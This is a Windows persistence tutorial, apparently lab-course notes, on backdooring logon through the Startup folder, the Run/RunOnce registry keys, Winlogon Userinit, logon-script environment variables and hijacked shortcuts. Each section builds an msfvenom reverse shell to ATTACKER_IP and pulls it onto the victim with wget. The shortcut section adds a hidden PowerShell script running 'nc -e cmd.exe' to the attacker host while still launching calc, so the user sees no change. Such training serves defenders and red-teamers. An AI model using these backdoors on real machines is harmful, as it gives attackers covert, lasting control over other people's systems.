# Logon Triggered Persistence

* Some actions performed by a user might also be bound to executing specific payloads for persistence.
* Windows operating systems present several ways to link payloads with particular interactions.

### Startup folder

* Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in.
* If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

* We will then copy our payload into the victim machine. You can spawn an `http.server` with `Python3` and use `wget` on the victim machine to pull your file:

```
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

```
Powershell
wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.

Command Prompt
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

* Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

### Run / RunOnce

* You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

* The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

* After transferring it to the victim machine, let's move it to C:\Windows:

```
move revshell.exe C:\Windows
```

Let's then create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.

![](https://user-images.githubusercontent.com/75596877/181061126-ae241ccd-7767-4401-9964-960d5ec878c3.png)

* After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).

### Winlogon

* Another alternative to automatically start programs on logon is abusing `Winlogon`, the Windows component that loads your user profile right after authentication (amongst other things).
* `Winlogon` uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:
* `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
* `shell` points to the system's shell, which is usually `explorer.exe`.

![](https://user-images.githubusercontent.com/75596877/181061468-d7eb9627-d9cd-4b9d-a9e0-355c4a9e81e4.png)

* If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired.
* Interestingly, you can append commands separated by a comma, and `Winlogon` will process them all.
* Let's start by creating a shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

* We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:

```
move revshell.exe C:\Windows
```

* We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.

![](https://user-images.githubusercontent.com/75596877/181061788-a42a814a-521c-4b04-a706-3dddc5008385.png)

* After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

### Logon scripts

* One of the things userinit.exe does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.
* Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.
* Let's first create a reverse shell to use for this technique:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

* We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:

```
move revshell.exe C:\Windows
```

To create an environment variable for a user, you can go to its HKCU\Environment in the registry. We will use the UserInitMprLogonScript entry to point to our payload so it gets loaded when the users logs in:

### Shortcut Files

* If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.
* For this task, let's check the shortcut to calc on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:
* ![7a7349b9dcc5af3180044ee1d7605967](https://user-images.githubusercontent.com/75596877/181036507-79d32d8d-2337-481f-b4c4-6766d6606f21.png)
* Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
```

* Finally, we'll change the shortcut to point to our script.
* Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user.
* We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:

```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

* ![fe703ddea6135e0c867afcc6f61a8cd2](https://user-images.githubusercontent.com/75596877/181037158-baa12732-f2d9-412f-aaa9-8ca74d3123b2.png)
* Let's start an nc listener to receive our reverse shell on our attacker's machine:

```
nc -lvp 4445
```

* If you double-click the shortcut, you should get a connection back to your attacker's machine.
* Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen.
